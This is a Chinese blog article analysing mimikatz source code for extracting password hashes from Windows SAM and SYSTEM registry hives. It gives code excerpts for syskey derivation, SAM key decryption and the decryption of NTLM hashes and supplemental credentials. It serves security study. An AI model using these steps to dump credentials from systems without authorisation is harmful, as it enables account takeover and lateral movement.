# mimikatz源码分析-lsadump模块（注册表）

阅读量 **247553**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-12-27 15:30:01

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t019e3fba1a98d25384.jpg)

>
> mimikatz是内网渗透中的一大利器，本文是分析学习mimikatz源码的第二篇，主要讨论学习lsadump模块的sam部分，即从注册表获取用户哈希的部分

## Windows注册表hive格式分析

mimikatz的这个功能从本质上是解析Windows的数据库文件，从而获取其中存储的用户哈希。所以这里先简要对Windows注册表hive文件做简要说明，详细点的介绍可参见[Windows注册表HIVE文件格式解析](https://blog.csdn.net/zacklin/article/details/7682582)和[简单认识下注册表的HIVE文件格式](https://bbs.pediy.com/thread-64000.htm)两篇文章。

总的来说，hive文件的内容结构有点PE文件的意味，有“文件头”和各个“节区”、“节区头”。当然这里的“文件头”被叫做`HBASE_BLOCK`，“节区头”和“节区”分别叫做`BIN`和`CELL`也即“巢箱”和“巢室”。整个hive文件被叫做“储巢”，特点是以`HBASE_BLOCK`开头，用来记录hive文件的各种信息。  
画了个图，看上去可能会直观点：

![](https://p0.ssl.qhimg.com/t0171daafa71e7bde2b.jpg)

关于各个部分的结构体定义可参考010Editor提供的模板脚本，不过笔者使用模板代码时并不能正确解析hive文件，所以后文涉及键值查询时以mimikatz中的定义的结构体为准。

### `HBASE_BLOCK`

010Editor分析后对应结构的描述如下图：

![](https://p5.ssl.qhimg.com/t01f79c77e875b2fad9.png)

每个字段的含义可以根据对应的名称得知，需要关注的是块的签名：`regf`。

### `HBIN`

010Editor分析后对应结构的描述如下图：

![](https://p0.ssl.qhimg.com/t013b65fcab933d3b38.png)

前面说到，这个结构相当于PE文件的节区头，它包含了“节区”的大小，偏移等信息，这里同样需要关注`HbinSignature`即签名，对于巢箱来讲，它的签名是`hbin`，有了这个签名，就可以定位到巢箱的位置保证后续能够正常查询到键值。不同类型的数据如键、值、安全描述符等分门别类的存放在各个类型的巢室中。

## mimikatz解析流程

在提供sam文件和system文件的情況下，解析的大体流程如下：

0x1 **获取注册表system的“句柄”**  
0x2 **读取计算机名和解密密钥**  
0x3 **获取注册表sam的“句柄”**  
0x4 **读取用户名和用户哈希**

> 未提供sam文件和system文件的情況下，mimikatz会使用官方的api直接读取当前机器中的注册表

这里先对mimikatz中创建的几个结构体做简要说明，再继续对整个流程的分析。首先是`PKULL_M_REGISTRY_HANDLE`，这个结构体主要是用于标识操作的注册表对象以及注册表的内容，它由两个成员构成，即：

    
    
    typedef struct _KULL_M_REGISTRY_HANDLE {
        KULL_M_REGISTRY_TYPE type;
        union {
            PKULL_M_REGISTRY_HIVE_HANDLE pHandleHive;
        };
    } KULL_M_REGISTRY_HANDLE, *PKULL_M_REGISTRY_HANDLE;
    

其中，`type`用于标识是对注册表hive文件操作，还是通过API直接读取当前机器中的注册表项，这里不再对其进一步说明。对于第二个成员`pHandleHive`就涉及到第二结构体了，先看它的定义：

    
    
    typedef struct _KULL_M_REGISTRY_HIVE_HANDLE
    {
        HANDLE hFileMapping;
        LPVOID pMapViewOfFile;
        PBYTE pStartOf;
        PKULL_M_REGISTRY_HIVE_KEY_NAMED pRootNamedKey;
    } KULL_M_REGISTRY_HIVE_HANDLE, *PKULL_M_REGISTRY_HIVE_HANDLE;
    

这个结构体实际上就是前面所说的注册表文件的“句柄”，由4个成员组成：

1、 `hFileMapping`：文件映射的句柄  
2、 `pMapViewOfFile`：指向文件映射映射到调用进程地址空间的位置，用来访问映射文件内容  
3、 `pStartOf`：指向注册表hive文件的第一个巢箱  
4、 `pRootNamedKey`：指向一个键巢室，用于查找子键和子键值

对于键巢室，mimikatz中定义的结构体如下：

    
    
    typedef struct _KULL_M_REGISTRY_HIVE_KEY_NAMED
    {
        LONG szCell;
        WORD tag;
        WORD flags;
        FILETIME lastModification;
        DWORD unk0;
        LONG offsetParentKey;
        DWORD nbSubKeys;
        DWORD nbVolatileSubKeys;
        LONG offsetSubKeys;
        LONG offsetVolatileSubkeys;
        DWORD nbValues;
        LONG offsetValues;
        LONG offsetSecurityKey;
        LONG offsetClassName;
        DWORD szMaxSubKeyName;
        DWORD szMaxSubKeyClassName;
        DWORD szMaxValueName;
        DWORD szMaxValueData;
        DWORD unk1;
        WORD szKeyName;
        WORD szClassName;
        BYTE keyName[ANYSIZE_ARRAY];
    } KULL_M_REGISTRY_HIVE_KEY_NAMED, *PKULL_M_REGISTRY_HIVE_KEY_NAMED;
    

这里和010Editor给出的结果大体上一致，关于两者的差异以及孰对孰错以笔者目前的水平还不足以甄别，不过这并不影响对mimikatz解析注册表这部分代码的分析学习。实际上只是用到了其中的几个成员，如tag(签名)、flags、nbSubKeys、offsetSubkeys等，而对于这些成员，从命名上可以判断二者所代表的含义应该是相似的。

###  获取注册表“句柄”

对于sam文件和system文件，这一步所作的操作都一样，即将文件映射到内存。这里主要涉及到两个Windows API：

1、`CreateFileMapping`，MSDN解释为指定文件创建或打开一个命名或未命名的文件映射对象，函数原型如下：

    
    
    HANDLE CreateFileMappingA(
      [in]           HANDLE                hFile,
      [in, optional] LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
      [in]           DWORD                 flProtect,
      [in]           DWORD                 dwMaximumSizeHigh,
      [in]           DWORD                 dwMaximumSizeLow,
      [in, optional] LPCSTR                lpName
    );
    

这里主要关注两个参数，一是`hFile`即文件句柄，可以由`CreateFile`获得；二是`flProtect`，用于标识权限如`PAGE_READWRITE`

2、`MapViewOfFile`，MSDN解释为将文件映射映射到调用进程的地址空间，函数原型如下：

    
    
    LPVOID MapViewOfFile(
      [in] HANDLE hFileMappingObject,
      [in] DWORD  dwDesiredAccess,
      [in] DWORD  dwFileOffsetHigh,
      [in] DWORD  dwFileOffsetLow,
      [in] SIZE_T dwNumberOfBytesToMap
    );
    

同样的，这里关注两个参数，一是`hFileMappingObject`，顾名思义，文件映射的句柄；二是`dwDesiredAccess`，映射对象的访问权限，同`CreateFileMapping`的参数`flProtect`。

通过这种方式可以方便的处理大文件，因为创建一个大的文件映射时不会占用任何系统资源，只有在调用如`MapViewOfFile`来访问文件内容时才消耗系统资源，而对于`MapViewOfFile`而言，完全可以一次只映射文件数据的一小部分，然后在取消当前映射后再重新映射新的内容。这样一来，即便是处理超大文件，也不会导致进程本身占用内存过多。

回到正题，在mimikatz的源码中，创建注册表hive文件的映射目的还是为了读取文件内容，首先通过`regf`定位到hive文件的头，随后通过偏移定位到第一个bin，然后保存相关的信息：

    
    
    if((pFh->tag == 'fger') && (pFh->fileType == 0))
    {
        pBh = (PKULL_M_REGISTRY_HIVE_BIN_HEADER) ((PBYTE) pFh + sizeof(KULL_M_REGISTRY_HIVE_HEADER));
        if(pBh->tag == 'nibh')
        {
            (*hRegistry)->pHandleHive->pStartOf = (PBYTE) pBh;
            (*hRegistry)->pHandleHive->pRootNamedKey = (PKULL_M_REGISTRY_HIVE_KEY_NAMED) ((PBYTE) pBh + sizeof(KULL_M_REGISTRY_HIVE_BIN_HEADER) + pBh->offsetHiveBin);
            status = (((*hRegistry)->pHandleHive->pRootNamedKey->tag == 'kn') && ((*hRegistry)->pHandleHive->pRootNamedKey->flags & (KULL_M_REGISTRY_HIVE_KEY_NAMED_FLAG_ROOT | KULL_M_REGISTRY_HIVE_KEY_NAMED_FLAG_LOCKED)));
        }
    }
    

这里需要注意的点是第一个巢室即`pRootNameKey`需要对应为键巢室，否则“句柄”打开失败。

###  获取计算机名和解密密钥

获取句柄之后的操作对于`system`这个hive文件来讲，就是获取密钥了，密钥长度为16。这里的密钥位于`HKLM\SYSTEM\ControlSet000\Current\Control\LSA`，由四个不同的键的键值按固定顺序组合得到。  
首先查找键值，比如`JD`对应的值为`b8 18 7d 0b`，这一项在文件中对应的值如下图：

![](https://p5.ssl.qhimg.com/t01f36ce6fcf86f0747.png)

通过`swscanf_s`将宽字符转换为四个字节的密钥，查询完四个键之后即得到最后16个字节的密钥数据：

    
    
    const wchar_t * kuhl_m_lsadump_SYSKEY_NAMES[] = {L"JD", L"Skew1", L"GBG", L"Data"};
    ...
    for(i = 0 ; (i < ARRAYSIZE(kuhl_m_lsadump_SYSKEY_NAMES)) && status; i++)
    {
        status = FALSE;
        if(kull_m_registry_RegOpenKeyEx(hRegistry,  , kuhl_m_lsadump_SYSKEY_NAMES[i], 0, KEY_READ, &hKey))
        {
            szBuffer = 8 + 1;
            if(kull_m_registry_RegQueryInfoKey(hRegistry, hKey, buffer, &szBuffer, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))
                status = swscanf_s(buffer, L"%x", (DWORD *) &buffKey[i*sizeof(DWORD)]) != -1;
            kull_m_registry_RegCloseKey(hRegistry, hKey);
        }
        else PRINT_ERROR(L"LSA Key Class read error\n");
    }
    

得到16个字节的密钥数据之后按照固定的顺序组装即得到最终的密钥：

    
    
    const BYTE kuhl_m_lsadump_SYSKEY_PERMUT[] = {11, 6, 7, 1, 8, 10, 14, 0, 3, 5, 2, 15, 13, 9, 12, 4};
    ...
    for(i = 0; i < SYSKEY_LENGTH; i++)
        sysKey[i] = buffKey[kuhl_m_lsadump_SYSKEY_PERMUT[i]];
    

这里可能只需要看看两个函数的实现：

1、 `kull_m_registry_RegOpenKeyEx`，打开一个注册表键

这个函数的函数体由两个分支构成，一是通过`RegOpenKeyEx`这个API直接打开一个注册表键；二是递归查找提供的hive文件，定位到对应的子键列表巢室（hl）。所以，换句话说，打开一个注册表键，这里实际上是定位到想要获取的巢室：

    
    
    pHbC = (PKULL_M_REGISTRY_HIVE_BIN_CELL) (hRegistry->pHandleHive->pStartOf + pKn->offsetSubKeys);
    if(ptrF = wcschr(lpSubKey, L'\\'))
    {
        if(buffer = (wchar_t *) LocalAlloc(LPTR, (ptrF - lpSubKey + 1) * sizeof(wchar_t)))
        {
            RtlCopyMemory(buffer, lpSubKey, (ptrF - lpSubKey) * sizeof(wchar_t));
            if(*phkResult = (HKEY) kull_m_registry_searchKeyNamedInList(hRegistry, pHbC, buffer))
                kull_m_registry_RegOpenKeyEx(hRegistry, *phkResult, ptrF + 1, ulOptions, samDesired, phkResult);
            LocalFree(buffer);
        }
    }
    else *phkResult = (HKEY) kull_m_registry_searchKeyNamedInList(hRegistry, pHbC, lpSubKey);
    

首先通过键巢室的`offsetSubKeys`成员获取子键列表距离巢箱的偏移，随后调用`kull_m_registry_searchKeyNamedInList`定位到要查找的巢室。当然，这里有两种情况，一是要查找的子键包含路径,形如`Control\LSA`；二是不包含路径如`Select`，这种情况也即是要获取的键和根键同级。关于`Select`，可以在`regedit`中看到：

![](https://p5.ssl.qhimg.com/t010b16433dd3168bf1.png)

在mimikatz的代码里面，获取计算机名以及密钥是先定位该子键的：

    
    
    // kuhl_m_lsadump_getComputerAndSyskey
    if(kuhl_m_lsadump_getCurrentControlSet(hRegistry, hSystemBase, &hCurrentControlSet))
    {
        kprintf(L"Domain : ");
        if(kull_m_registry_OpenAndQueryWithAlloc(hRegistry, hCurrentControlSet, L"Control\\ComputerName\\ComputerName", L"ComputerName", NULL, &computerName, NULL))
        {
            kprintf(L"%s\n", computerName);
            LocalFree(computerName);
        }
        kprintf(L"SysKey : ");
        if(kull_m_registry_RegOpenKeyEx(hRegistry, hCurrentControlSet, L"Control\\LSA", 0, KEY_READ, &hComputerNameOrLSA))
    ...
    // kuhl_m_lsadump_getCurrentControlSet
    wchar_t currentControlSet[] = L"ControlSet000";
    if(kull_m_registry_RegOpenKeyEx(hRegistry, hSystemBase, L"Select", 0, KEY_READ, &hSelect))
    {
        for(i = 0; !status && (i < ARRAYSIZE(kuhl_m_lsadump_CONTROLSET_SOURCES)); i++)
        {
            szNeeded = sizeof(DWORD); 
            status = kull_m_registry_RegQueryValueEx(hRegistry, hSelect, kuhl_m_lsadump_CONTROLSET_SOURCES[i], NULL, NULL, (LPBYTE) &controlSet, &szNeeded);
        }
    

随后就是定位到具体的巢室了，对应的函数为`kull_m_registry_searchKeyNamedInList`，这个函数做的操作只有一个，即遍历子键列表。

    
    
    case 'hl':
        pLfLh = (PKULL_M_REGISTRY_HIVE_LF_LH) pHbC;
        for(i = 0 ; i < pLfLh->nbElements && !result; i++)
        {
            pKn = (PKULL_M_REGISTRY_HIVE_KEY_NAMED) (hRegistry->pHandleHive->pStartOf + pLfLh->elements[i].offsetNamedKey);
            if(pKn->tag == 'kn')
            {
                if(pKn->flags & KULL_M_REGISTRY_HIVE_KEY_NAMED_FLAG_ASCII_NAME)
                    buffer = kull_m_string_qad_ansi_c_to_unicode((char *) pKn->keyName, pKn->szKeyName);
                else if(buffer = (wchar_t *) LocalAlloc(LPTR, pKn->szKeyName + sizeof(wchar_t)))
                    RtlCopyMemory(buffer, pKn->keyName, pKn->szKeyName);
    
                if(buffer)
                {
                    if(_wcsicmp(lpSubKey, buffer) == 0)
                        result = pKn;
                    LocalFree(buffer);
                }
            }
        }
        break;
    

对应的，这里对子键列表巢室的描述如下：

    
    
    typedef struct _KULL_M_REGISTRY_HIVE_LF_LH
    {
        LONG szCell;
        WORD tag;
        WORD nbElements;
        KULL_M_REGISTRY_HIVE_LF_LH_ELEMENT elements[ANYSIZE_ARRAY];
    } KULL_M_REGISTRY_HIVE_LF_LH, *PKULL_M_REGISTRY_HIVE_LF_LH;
    

成员简单但各自的作用都很明显，成员`elements`即我们想要遍历的子键列表，此外`nbElements`是子键列表的长度。

整个过程有点像遍历二叉树，从根节点开始到每个叶子节点，层层递进，知道定位到目标键巢室。这里值得注意的是从键巢室到键巢室，中间是通过子键列表巢室来查询的，即每个键巢室保存了一个指向其子键的列表的偏移，需要查询其子键时就通过这个列表获取对应子键的偏移最终达到定位的目的。

2、 `kull_m_registry_RegQueryInfoKey`，获取键值

打开对应的键之后（定位到对应的键巢室），就是查询相应的键值了，这里同样也有两种情况，即通过`RegQueryInfoKey`这个API直接查询，另一种情况是直接从hive文件获取。首先看如何获取hive文件中的内容，不过这部分操作实际就是从定位到的键巢室把数据拿出来写入到对应的传入的参数，对于键值的获取，则是通过`offsetClassName`成员定位的：

    
    
    // kull_m_registry_RegQueryInfoKey
    if(status = (*lpcClass > szInCar))
    {
        RtlCopyMemory(lpClass, &((PKULL_M_REGISTRY_HIVE_BIN_CELL) (hRegistry->pHandleHive->pStartOf + pKn->offsetClassName))->data , pKn->szClassName);
        lpClass[szInCar] = L'\0';
    }
    // kull_m_registry_structures.h
    typedef struct _KULL_M_REGISTRY_HIVE_BIN_CELL
    {
        LONG szCell;
        union{
            WORD tag;
            BYTE data[ANYSIZE_ARRAY];
        };
    } KULL_M_REGISTRY_HIVE_BIN_CELL, *PKULL_M_REGISTRY_HIVE_BIN_CELL;
    

对于计算机名，存储在`HKLM\SYSTEM\ControlSet000\Current\Control\ComputerName\ComputerName`，通过regedit就可以直接查看到，当然代码中同样也是通过定位巢室来获取(最终都是调用`kull_m_registry_searchValueNameInList`获取对应的键值，和获取密钥的流程一致，只是这里不需要获取多个键值)。但是对于密钥来讲，笔者并未找到通过regedit直接查看的方法。

前面还提到了两个API，即`RegOpenKeyEx`和`RegQueryInfoKey`，在直接读取本地的计算机名和密钥时，直接使用这两个API就要方便的多。首先第一个函数的原型如下：

    
    
    LONG RegOpenKeyEx( 
      HKEY hKey, 
      LPCWSTR lpSubKey, 
      DWORD ulOptions, 
      REGSAM samDesired, 
      PHKEY phkResult 
    );
    

对于第一个参数，一个打开的键或者以下的四个宏：

  * HKEY_LOCAL_MACHINE
  * HKEY_CLASSES_ROOT
  * HKEY_CURRENT_USER
  * HKEY_USERS

其实这四个宏刚好对应到用regedit打开注册表时看到的四个主键，函数执行成功后即打开一个键，返回一个句柄到`phkResilt`，这个句柄可以为下一次调用`RegOpenKeyEx`所使用。对于剩下的三个参数，需要对`samDesired`说明一下，在[msdn](https://docs.microsoft.com/en-us/previous-versions/aa912084\(v=msdn.10)解释是这个参数是保留参数，设置为0，但是mimikatz的代码中这里传递了一个`WinNT.h`中的宏：`KEY_READ`。

第二个函数原型如下：

    
    
    LONG RegQueryInfoKey( 
      HKEY hKey, 
      LPWSTR lpClass, 
      LPDWORD lpcbClass, 
      LPDWORD lpReserved, 
      LPDWORD lpcSubKeys, 
      LPDWORD lpcbMaxSubKeyLen, 
      LPDWORD lpcbMaxClassLen, 
      LPDWORD lpcValues, 
      LPDWORD lpcbMaxValueNameLen, 
      LPDWORD lpcbMaxValueLen, 
      LPDWORD lpcbSecurityDescriptor, 
      PFILETIME lpftLastWriteTime 
    );
    

要达到查询键值的目的，这里重点关注前三个参数，其中`hKey`同`RegOpenKeyEx`，后面两个参数分别对应存储值的缓冲区以及值的大小。

###  获取用户名和用户哈希

解析完SYSTEM，接下来就是SAM了。同样的，首先是打开一个“句柄”，这里的操作和签名的操作完全一致。随后就是查询用户名和用户哈希，不过在这之前先查询了SID，过程和前面查询计算机名一致，只是这里路径换成了`HKLM\SAM\Domains\Account`，键名从`ComputerName`变成了`V`，这个可以通过regedit直接看到：

![](https://p3.ssl.qhimg.com/t018661174c1ee39ee1.png)

不过这里获取SID调用了一个API：`ConvertSidToStringSid`，传入的值即`V`对应的部分键值(其实从传入的参数可以大致猜出键值的组成即用户+sid，当然这里不是本文的重点):

    
    
    kull_m_string_displaySID((PBYTE) data + szUser - (sizeof(SID) + sizeof(DWORD) * 3));
    

重点在于用户名及其对应的哈希的获取，大体的流程分三部分：

1、获取SamKey  
2、获取用户名  
3、获取用户哈希

首先是获取SamKey，它的值位于”HKLM\SAM\Domains\Account\F”，不过值本身是加密的，解密密钥是前面从system中获取的syskey，加密算法分两个版本（rc4和aes128），由具体的版本决定采用的加密算法，这里涉及两个结构体：

    
    
    typedef struct _SAM_KEY_DATA {
        DWORD Revision;
        DWORD Length;
        BYTE Salt[SAM_KEY_DATA_SALT_LENGTH];
        BYTE Key[SAM_KEY_DATA_KEY_LENGTH];
        BYTE CheckSum[MD5_DIGEST_LENGTH];
        DWORD unk0;
        DWORD unk1;
    } SAM_KEY_DATA, *PSAM_KEY_DATA;
    
    typedef struct _DOMAIN_ACCOUNT_F {
        WORD Revision;
        WORD unk0;
        DWORD unk1;
        OLD_LARGE_INTEGER CreationTime;
        OLD_LARGE_INTEGER DomainModifiedCount;
        OLD_LARGE_INTEGER MaxPasswordAge;
        OLD_LARGE_INTEGER MinPasswordAge;
        OLD_LARGE_INTEGER ForceLogoff;
        OLD_LARGE_INTEGER LockoutDuration;
        OLD_LARGE_INTEGER LockoutObservationWindow;
        OLD_LARGE_INTEGER ModifiedCountAtLastPromotion;
        DWORD NextRid;
        DWORD PasswordProperties;
        WORD MinPasswordLength;
        WORD PasswordHistoryLength;
        WORD LockoutThreshold;
        DOMAIN_SERVER_ENABLE_STATE ServerState;
        DOMAIN_SERVER_ROLE ServerRole;
        BOOL UasCompatibilityRequired;
        DWORD unk2;
        SAM_KEY_DATA keys1;
        SAM_KEY_DATA keys2;
        DWORD unk3;
        DWORD unk4;
    } DOMAIN_ACCOUNT_F, *PDOMAIN_ACCOUNT_F;
    

先说`_DOMAIN_ACCOUNT_F`，成员`Revision`的值需为3，才能正确进入后后续的解密流程；成员`keys1`包含了samkey如`_SAM_KEY_DATA`所描述的内容。其他的成员在mimikatz的代码里似乎没有用到，而对于`_SAM_KEY_DATA`来说只适用于加密算法采用rc4的情况，此时对应的`Revision`为1，加密密钥是由成员`Salt`的值作为盐，并用syskey作为密钥采用md5摘要算法生成，然后对成员`Key`进行rc4解密:

    
    
    MD5Init(&md5ctx);
    MD5Update(&md5ctx, pDomAccF->keys1.Salt, SAM_KEY_DATA_SALT_LENGTH);
    MD5Update(&md5ctx, kuhl_m_lsadump_qwertyuiopazxc, sizeof(kuhl_m_lsadump_qwertyuiopazxc));
    MD5Update(&md5ctx, sysKey, SYSKEY_LENGTH);
    MD5Update(&md5ctx, kuhl_m_lsadump_01234567890123, sizeof(kuhl_m_lsadump_01234567890123));
    MD5Final(&md5ctx);
    RtlCopyMemory(samKey, pDomAccF->keys1.Key, SAM_KEY_DATA_KEY_LENGTH);
    if(!(status = NT_SUCCESS(RtlDecryptData2(&data, &key))))
    

采用aes128的时候对应的`Revision`为2，这时候`keys1`会被转换为`PSAM_KEY_DATA_AES`结构体类型，该结构体定义如下：

    
    
    typedef struct _SAM_KEY_DATA_AES {
        DWORD Revision; // 2
        DWORD Length;
        DWORD CheckLen;
        DWORD DataLen;
        BYTE Salt[SAM_KEY_DATA_SALT_LENGTH];
        BYTE data[ANYSIZE_ARRAY]; // Data, then Check
    } SAM_KEY_DATA_AES, *PSAM_KEY_DATA_AES;
    

从结构体成员看二者大差不差，加密流程来看Slat被用作AES加密的IV，syskey则是AES加密的密钥，最后密文即samkey在成员`data`中。解密部分代码如下：

    
    
    if(kull_m_crypto_hkey(hProv, CALG_AES_128, pKey, 16, 0, &hKey, NULL))
    {
        if(CryptSetKeyParam(hKey, KP_MODE, (LPCBYTE) &mode, 0))
        {
            if(CryptSetKeyParam(hKey, KP_IV, (LPCBYTE) pIV, 0))
            {
                if(*pOut = LocalAlloc(LPTR, dwDataLen))
                {
                    *dwOutLen = dwDataLen;
                    RtlCopyMemory(*pOut, pData, dwDataLen);
                    if(!(status = CryptDecrypt(hKey, 0, TRUE, 0, (PBYTE) *pOut, dwOutLen)))
    

获取到samkey之后的操作就是遍历`HKLM\SAM\Domains\Account\Users`，键值的获取和前面讨论的获取键值的流程一致，这里不再赘述，获取用户名和对应的哈希大体流程如下：

1、查询Users对应的键值，获取子键个数即用户的数量  
2、遍历获取用户(Users下面的子键（RID）)  
3、打开子键并获取键值(子键V的值)  
4、解析获取到的键值并使用samKey解密数据得到用户哈希

关键看如何从键值中获取用户名以及对应的哈希，对于获取的数据mimikatz用以下结构体描述：

    
    
    typedef struct _SAM_ENTRY {
        DWORD offset;
        DWORD lenght;
        DWORD unk;
    } SAM_ENTRY, *PSAM_SENTRY;
    
    typedef struct _USER_ACCOUNT_V {
        SAM_ENTRY unk0_header;
        SAM_ENTRY Username;
        SAM_ENTRY Fullname;
        SAM_ENTRY Comment;
        SAM_ENTRY UserComment;
        SAM_ENTRY unk1;
        SAM_ENTRY Homedir;
        SAM_ENTRY HomedirConnect;
        SAM_ENTRY ScriptPath;
        SAM_ENTRY ProfilePath;
        SAM_ENTRY Workstations;
        SAM_ENTRY HoursAllowed;
        SAM_ENTRY unk2;
        SAM_ENTRY LMHash;
        SAM_ENTRY NTLMHash;
        SAM_ENTRY NTLMHistory;
        SAM_ENTRY LMHistory;
        BYTE datas[ANYSIZE_ARRAY];
    } USER_ACCOUNT_V, *PUSER_ACCOUNT_V;
    

从结构体定义可以看出，我们想要获取的数据在成员datas中，其他成员主要记录了对应的值的长度以及在datas中的偏移，比如要获取用户名即`datas+Username->offset`。这里用户名是明文存储的，所以可以直接获取，但是对应的哈希是以密文的形式存储，解密密钥为前面获取的samKey，解密流程和解密samKey一致，只是在细节上有所差异：

1、采用rc4加密时，生成密钥这里用到了samKey、rid以及固定的字符串如`NTPASSWORDHISTORY`  
2、采用aes128加密时，密钥换成了samKey，其他的于前面基本一致，只是这里描述加密数据的结构体有所变化：

    
    
    typedef struct _SAM_HASH_AES {
        WORD PEKID;
        WORD Revision;
        DWORD dataOffset;
        BYTE Salt[SAM_KEY_DATA_SALT_LENGTH];
        BYTE data[ANYSIZE_ARRAY]; // Data
    } SAM_HASH_AES, *PSAM_HASH_AES;
    

此外，这里解密之后得到的数据依旧不是最终想要的哈希，这是和前面获取samKey最关键的不同之处：

    
    
    kuhl_m_lsadump_dcsync_decrypt(cypheredHashBuffer.Buffer, cypheredHashBuffer.Length, rid, isNtlm ? (isHistory ? L"ntlm" : L"NTLM" ) : (isHistory ? L"lm  " : L"LM  "), isHistory);
    

这个函数内部实际上是调用了`cryptsp.dll`中的函数`SystemFunction027`，其实前面rc4解密调用的函数也是这个dll中的函数：`SystemFunction033`。简单看一下这里的解密操作：

    
    
      KeysFromIndex(index, v6);
      result = SystemFunction002(encData, v6, decData);
      if ( (int)result >= 0 )
        return SystemFunction002(encData + 8, v7, decData + 8);
      return result;
    

其中，`KeysFromIndex`实际上就是根据传入的index生成一个用于解密的key，然后传递到`SystemFunction002`进行解密操作，`SystemFunction002`位于`cryptbase.dll`，实际上是DES解密：

    
    
    __int64 __fastcall SystemFunction002(__int64 a1, __int64 a2, __int64 a3)
    {
      __int64 result; // rax
    
      result = DES_ECB_LM(0i64, a2, a1, a3);
      if ( (_DWORD)result )
        return 3221225473i64;
      return result;
    }
    

这里其实有套娃的味道了，不过我们可以不用关心具体的解密流程，只需直接调用`SystemFunction027`就可以对数据进行解密进而获得用户哈希了。

在获取到用户的哈希之后还注意到一个函数：`kuhl_m_lsadump_getSupplementalCreds`，函数做的操作是获取RID对应的键的子键`SupplementalCreds`的数据，解析并解密获取对应用户的`SupplementalCredentials`属性，关于这个属性可参见[MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/0705f888-62e1-4a4c-bac0-b4d427f396f8?redirectedfrom=MSDN)

可以重点关注一下MSDN中给的表：

![](https://p5.ssl.qhimg.com/t01072811131b3ed68b.png)

可以看到，这里面是包含了明文密码以及明文密码的哈希的，每个字段的格式在文档中也有说明，感兴趣的可以看看。在mimikatz的代码中，定义了两个结构体，一是描述加密后的数据：

    
    
    typedef struct _KIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS {
        DWORD unk0;
        DWORD unkSize;
        DWORD unk1; // flags ?
        DWORD originalSize;
        BYTE iv[LAZY_IV_SIZE];
        BYTE encrypted[ANYSIZE_ARRAY];
    } KIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS, *PKIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS;
    

和前面的其实如出一辙，解密密钥同样使用的是samKey，加密算法和解密用户哈希一样也是aes128。另一个结构体则是用来描述具体的SupplementalCredentials信息：

    
    
    typedef struct _USER_PROPERTIES {
        DWORD Reserved1;
        DWORD Length;
        USHORT Reserved2;
        USHORT Reserved3;
        BYTE Reserved4[96];
        wchar_t PropertySignature;
        USHORT PropertyCount;
        USER_PROPERTY UserProperties[ANYSIZE_ARRAY];
    } USER_PROPERTIES, *PUSER_PROPERTIES;
    

属性的签名为`P`，通过成员`PropertyCount`遍历成员`UserProperties`，需要注意的点是每个属性名是UTF-16编码的字符所以在mimikatz中定义了一个名为`UNICODE_STRING`的类型来描述对应的数据：

    
    
    #define DECLARE_UNICODE_STRING(_var, _string) \
    const WCHAR _var ## _buffer[] = _string; \
    UNICODE_STRING _var = { sizeof(_string) - sizeof(WCHAR), sizeof(_string), (PWCH) _var ## _buffer }
    

此外，对于每个属性的描述用结构体`_USER_PROPERTY`

    
    
    typedef struct _USER_PROPERTY {
        USHORT NameLength;
        USHORT ValueLength;
        USHORT Reserved;
        wchar_t PropertyName[ANYSIZE_ARRAY];
        // PropertyValue in HEX !
    } USER_PROPERTY, *PUSER_PROPERTY;
    

每轮遍历结束，寻找下一个属性名就加上NameLength和ValueLength，有点链表的意味，其实可以发现整个hive文件都是这样的形式，通过头记录对应的数据信息，同类型的数据通过大小来计算偏移，不同的数据类型就根据头中的偏移来定位。

每轮遍历首先做的是将属性值转换成hex的格式：

    
    
    for(j = 0; j < szData; j++)
    {
        sscanf_s(&value[j*2], "%02x", &k);
        data[j] = (BYTE) k;
    }
    

随后就是判断属性的具体类型，支持的类型也即是前面提到的表中的类型定义为常量的形式：

    
    
    DECLARE_CONST_UNICODE_STRING(PrimaryCleartext, L"Primary:CLEARTEXT");
    DECLARE_CONST_UNICODE_STRING(PrimaryWDigest, L"Primary:WDigest");
    DECLARE_CONST_UNICODE_STRING(PrimaryKerberos, L"Primary:Kerberos");
    DECLARE_CONST_UNICODE_STRING(PrimaryKerberosNew, L"Primary:Kerberos-Newer-Keys");
    DECLARE_CONST_UNICODE_STRING(PrimaryNtlmStrongNTOWF, L"Primary:NTLM-Strong-NTOWF");
    DECLARE_CONST_UNICODE_STRING(Packages, L"Packages");
    

如果是`Primary:CLEARTEXT`就直接打印出明文的字符串，否则就打印出十六进制字符串，不过其余的属性都定义有有描述其结构的结构体，以`Primary:Kerberos`为例，描述它的有两个结构体：

    
    
    typedef struct _KERB_KEY_DATA {
        USHORT    Reserverd1;
        USHORT    Reserverd2;
        ULONG    Reserverd3;
        LONG    KeyType;
        ULONG    KeyLength;
        ULONG    KeyOffset;
    } KERB_KEY_DATA, *PKERB_KEY_DATA;
    
    typedef struct _KERB_STORED_CREDENTIAL {
        USHORT    Revision;
        USHORT    Flags;
        USHORT    CredentialCount;
        USHORT    OldCredentialCount;
        USHORT    DefaultSaltLength;
        USHORT    DefaultSaltMaximumLength;
        ULONG    DefaultSaltOffset;
        //KERB_KEY_DATA    Credentials[ANYSIZE_ARRAY];
        //KERB_KEY_DATA    OldCredentials[ANYSIZE_ARRAY];
        //BYTE    DefaultSalt[ANYSIZE_ARRAY];
        //BYTE    KeyValues[ANYSIZE_ARRAY];
    } KERB_STORED_CREDENTIAL, *PKERB_STORED_CREDENTIAL;
    

其中，`_KERB_STORED_CREDENTIAL`相当于该属性值的头，紧随其后的就是对应的值，即`_KERB_KEY_DATA`，它记录了对应属性保存的明文密码哈希值，不过需要注意的是其中的KeyOffset是相对于`_KERB_STORED_CREDENTIAL`的偏移，这部分对应的代码如下：

    
    
    // kuhl_m_lsadump_dcsync_descrUserProperties
    else if(RtlEqualUnicodeString(&PrimaryKerberos, &Name, TRUE))
    {
        pKerb = (PKERB_STORED_CREDENTIAL) data;
        kprintf(L"    Default Salt : %.*s\n", pKerb->DefaultSaltLength / sizeof(wchar_t), (PWSTR) ((PBYTE) pKerb + pKerb->DefaultSaltOffset));
